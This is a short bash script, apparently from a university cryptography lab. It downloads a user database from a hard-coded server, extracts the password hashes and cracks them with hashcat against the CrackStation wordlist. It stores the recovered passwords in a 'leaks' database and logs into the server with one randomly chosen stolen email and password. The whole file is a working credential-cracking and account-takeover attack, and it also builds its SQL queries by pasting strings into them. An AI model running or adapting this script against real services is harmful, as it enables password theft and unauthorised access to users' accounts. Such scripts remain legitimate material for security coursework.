#!/bin/bash
set -euo pipefail
IFS=$'\n\t'
server="http://94.103.95.24:5003"
dictionary="$HOME/University/crypto proto/crackstation.txt"

curl "$server/db" 2>/dev/null > db
printf ".mode list\nSELECT password FROM user;\n" | sqlite3 db > hashlist
[[ "$(read -e -p 'Run hashcat session (slow, ~15min)? [y/N]> '; echo $REPLY)" == [Yy]* ]] && hashcat -m 10 hashlist "$dictionary" || true
cracked="$(hashcat -m 10 hashlist "$dictionary" --show || true)"
echo "$cracked" | while read sample; do
	leak="$(echo "$sample" | tr ":" " " | awk '{print $2}')"
	printf "INSERT INTO passwords(password) VALUES('$leak')" | sqlite3 leaks 2>/dev/null || true
done
sample="$(echo "$cracked" | shuf -n1)"
target_hash="$(echo "$sample" | tr ":" " " | awk '{print $1 ":" $2}')"
target_password="$(echo "$sample" | tr ":" " " | awk '{print $3}')"
target_email="$(printf "SELECT email FROM user WHERE password LIKE '$target_hash';\n" | sqlite3 db)"
output="$(curl --data "email=$target_email&password=$target_password" "$server/login" 2>/dev/null)"
if echo "$output" | grep profile >/dev/null; then
	echo "Success, used credentials: $target_email:$target_password"
else
	echo "Failure"
	exit 1
fi
rm hashlist
rm db
